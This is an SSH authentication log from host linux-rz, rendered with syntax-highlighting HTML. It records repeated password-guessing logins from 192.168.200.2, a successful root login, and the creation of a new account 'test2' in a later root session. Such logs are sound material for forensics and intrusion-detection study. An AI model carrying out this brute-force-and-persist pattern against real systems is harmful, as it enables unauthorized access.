Aug  <span class="token number">1</span> 07:46:54 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7482</span><span class="token punctuation">]</span>: Connection closed by invalid user user <span class="token number">192.168</span>.200.2 port <span class="token number">37489</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:46:54 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7484</span><span class="token punctuation">]</span>: Invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">35575</span>
Aug  <span class="token number">1</span> 07:46:54 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7484</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:46:54 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7484</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:46:56 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7484</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">35575</span> ssh2
Aug  <span class="token number">1</span> 07:46:57 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7484</span><span class="token punctuation">]</span>: Connection closed by invalid user user <span class="token number">192.168</span>.200.2 port <span class="token number">35575</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:46:57 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7486</span><span class="token punctuation">]</span>: Invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">35833</span>
Aug  <span class="token number">1</span> 07:46:57 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7486</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:46:57 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7486</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:46:59 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7486</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">35833</span> ssh2
Aug  <span class="token number">1</span> 07:46:59 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7486</span><span class="token punctuation">]</span>: Connection closed by invalid user hello <span class="token number">192.168</span>.200.2 port <span class="token number">35833</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:00 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7489</span><span class="token punctuation">]</span>: Invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">37653</span>
Aug  <span class="token number">1</span> 07:47:00 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7489</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:47:00 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7489</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:47:02 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7489</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">37653</span> ssh2
Aug  <span class="token number">1</span> 07:47:02 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7489</span><span class="token punctuation">]</span>: Connection closed by invalid user hello <span class="token number">192.168</span>.200.2 port <span class="token number">37653</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:02 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7491</span><span class="token punctuation">]</span>: Invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">37917</span>
Aug  <span class="token number">1</span> 07:47:02 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7491</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:47:02 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7491</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:47:04 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7491</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">37917</span> ssh2
Aug  <span class="token number">1</span> 07:47:05 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7491</span><span class="token punctuation">]</span>: Connection closed by invalid user hello <span class="token number">192.168</span>.200.2 port <span class="token number">37917</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:05 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7493</span><span class="token punctuation">]</span>: Invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">41957</span>
Aug  <span class="token number">1</span> 07:47:05 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7493</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:47:05 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7493</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:47:08 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7493</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">41957</span> ssh2
Aug  <span class="token number">1</span> 07:47:08 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7493</span><span class="token punctuation">]</span>: Connection closed by invalid user hello <span class="token number">192.168</span>.200.2 port <span class="token number">41957</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:08 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7495</span><span class="token punctuation">]</span>: Invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">39685</span>
Aug  <span class="token number">1</span> 07:47:08 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7495</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:47:08 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7495</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:47:10 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7495</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">39685</span> ssh2
Aug  <span class="token number">1</span> 07:47:11 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7495</span><span class="token punctuation">]</span>: Connection closed by invalid user hello <span class="token number">192.168</span>.200.2 port <span class="token number">39685</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:11 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7497</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2  <span class="token assign-left variable">user</span><span class="token operator">=</span>root
Aug  <span class="token number">1</span> 07:47:13 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7497</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">34703</span> ssh2
Aug  <span class="token number">1</span> 07:47:15 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7497</span><span class="token punctuation">]</span>: Connection closed by authenticating user root <span class="token number">192.168</span>.200.2 port <span class="token number">34703</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:16 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7499</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2  <span class="token assign-left variable">user</span><span class="token operator">=</span>root
Aug  <span class="token number">1</span> 07:47:18 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7499</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">46671</span> ssh2
Aug  <span class="token number">1</span> 07:47:18 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7499</span><span class="token punctuation">]</span>: Connection closed by authenticating user root <span class="token number">192.168</span>.200.2 port <span class="token number">46671</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:18 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7501</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2  <span class="token assign-left variable">user</span><span class="token operator">=</span>root
Aug  <span class="token number">1</span> 07:47:20 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7501</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">39967</span> ssh2
Aug  <span class="token number">1</span> 07:47:20 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7501</span><span class="token punctuation">]</span>: Connection closed by authenticating user root <span class="token number">192.168</span>.200.2 port <span class="token number">39967</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:20 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7503</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2  <span class="token assign-left variable">user</span><span class="token operator">=</span>root
Aug  <span class="token number">1</span> 07:47:22 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7503</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">46647</span> ssh2
Aug  <span class="token number">1</span> 07:47:23 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7503</span><span class="token punctuation">]</span>: Connection closed by authenticating user root <span class="token number">192.168</span>.200.2 port <span class="token number">46647</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:23 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7505</span><span class="token punctuation">]</span>: Accepted password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">46563</span> ssh2
Aug  <span class="token number">1</span> 07:47:23 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7505</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user root by <span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
Aug  <span class="token number">1</span> 07:47:23 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: New session <span class="token number">7</span> of user root.
Aug  <span class="token number">1</span> 07:47:23 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7525</span><span class="token punctuation">]</span>: Invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">37013</span>
Aug  <span class="token number">1</span> 07:47:23 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7525</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:47:23 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7525</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:47:26 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7525</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">37013</span> ssh2
Aug  <span class="token number">1</span> 07:47:28 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7525</span><span class="token punctuation">]</span>: Connection closed by invalid user  <span class="token number">192.168</span>.200.2 port <span class="token number">37013</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:28 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7528</span><span class="token punctuation">]</span>: Invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">37545</span>
Aug  <span class="token number">1</span> 07:47:28 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7528</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:47:28 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7528</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:47:30 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7528</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">37545</span> ssh2
Aug  <span class="token number">1</span> 07:47:30 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7528</span><span class="token punctuation">]</span>: Connection closed by invalid user  <span class="token number">192.168</span>.200.2 port <span class="token number">37545</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:30 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7530</span><span class="token punctuation">]</span>: Invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">39111</span>
Aug  <span class="token number">1</span> 07:47:30 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7530</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:47:30 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7530</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:47:32 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7530</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">39111</span> ssh2
Aug  <span class="token number">1</span> 07:47:32 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7530</span><span class="token punctuation">]</span>: Connection closed by invalid user  <span class="token number">192.168</span>.200.2 port <span class="token number">39111</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:33 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7532</span><span class="token punctuation">]</span>: Invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">35173</span>
Aug  <span class="token number">1</span> 07:47:33 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7532</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:47:33 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7532</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:47:35 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7532</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">35173</span> ssh2
Aug  <span class="token number">1</span> 07:47:37 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7532</span><span class="token punctuation">]</span>: Connection closed by invalid user  <span class="token number">192.168</span>.200.2 port <span class="token number">35173</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:47:37 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7534</span><span class="token punctuation">]</span>: Invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">45807</span>
Aug  <span class="token number">1</span> 07:47:37 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7534</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: check pass<span class="token punctuation">;</span> user unknown
Aug  <span class="token number">1</span> 07:47:37 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7534</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2 
Aug  <span class="token number">1</span> 07:47:39 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7534</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">45807</span> ssh2
Aug  <span class="token number">1</span> 07:47:41 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7534</span><span class="token punctuation">]</span>: Connection closed by invalid user  <span class="token number">192.168</span>.200.2 port <span class="token number">45807</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 07:50:29 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7505</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
Aug  <span class="token number">1</span> 07:50:29 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: Session <span class="token number">7</span> logged out. Waiting <span class="token keyword">for</span> processes to exit.
Aug  <span class="token number">1</span> 07:50:29 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: Removed session <span class="token number">7</span>.
Aug  <span class="token number">1</span> 07:50:37 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7539</span><span class="token punctuation">]</span>: Accepted password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">48070</span> ssh2
Aug  <span class="token number">1</span> 07:50:37 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7539</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user root by <span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
Aug  <span class="token number">1</span> 07:50:37 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: New session <span class="token number">8</span> of user root.
Aug  <span class="token number">1</span> 07:50:45 linux-rz useradd<span class="token punctuation">[</span><span class="token number">7551</span><span class="token punctuation">]</span>: new group: <span class="token assign-left variable">name</span><span class="token operator">=</span>test2, <span class="token assign-left variable">GID</span><span class="token operator">=</span><span class="token number">1000</span>
Aug  <span class="token number">1</span> 07:50:45 linux-rz useradd<span class="token punctuation">[</span><span class="token number">7551</span><span class="token punctuation">]</span>: new user: <span class="token assign-left variable">name</span><span class="token operator">=</span>test2, <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1000</span>, <span class="token assign-left variable">GID</span><span class="token operator">=</span><span class="token number">1000</span>, <span class="token assign-left variable">home</span><span class="token operator">=</span>/home/test2, <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/sh
Aug  <span class="token number">1</span> 07:50:52 linux-rz passwd<span class="token punctuation">[</span><span class="token number">7563</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>passwd:chauthtok<span class="token punctuation">)</span>: password changed <span class="token keyword">for</span> test2
Aug  <span class="token number">1</span> 07:50:56 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7539</span><span class="token punctuation">]</span>: Received disconnect from <span class="token number">192.168</span>.200.2 port <span class="token number">48070</span>:11: disconnected by user
Aug  <span class="token number">1</span> 07:50:56 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7539</span><span class="token punctuation">]</span>: Disconnected from user root <span class="token number">192.168</span>.200.2 port <span class="token number">48070</span>
Aug  <span class="token number">1</span> 07:50:56 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7539</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
Aug  <span class="token number">1</span> 07:50:56 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: Session <span class="token number">8</span> logged out. Waiting <span class="token keyword">for</span> processes to exit.
Aug  <span class="token number">1</span> 07:50:56 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: Removed session <span class="token number">8</span>.
Aug  <span class="token number">1</span> 07:52:57 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7606</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:auth<span class="token punctuation">)</span>: authentication failure<span class="token punctuation">;</span> <span class="token assign-left variable">logname</span><span class="token operator">=</span> <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">tty</span><span class="token operator">=</span>ssh <span class="token assign-left variable">ruser</span><span class="token operator">=</span> <span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token number">192.168</span>.200.31  <span class="token assign-left variable">user</span><span class="token operator">=</span>root
Aug  <span class="token number">1</span> 07:52:59 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7606</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.31 port <span class="token number">40364</span> ssh2
Aug  <span class="token number">1</span> 07:53:01 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7606</span><span class="token punctuation">]</span>: Connection closed by authenticating user root <span class="token number">192.168</span>.200.31 port <span class="token number">40364</span> <span class="token punctuation">[</span>preauth<span class="token punctuation">]</span>
Aug  <span class="token number">1</span> 08:01:26 linux-rz sshd<span class="token punctuation">[</span><span class="token number">748</span><span class="token punctuation">]</span>: Received disconnect from <span class="token number">192.168</span>.200.2 port <span class="token number">50378</span>:11: disconnected by user
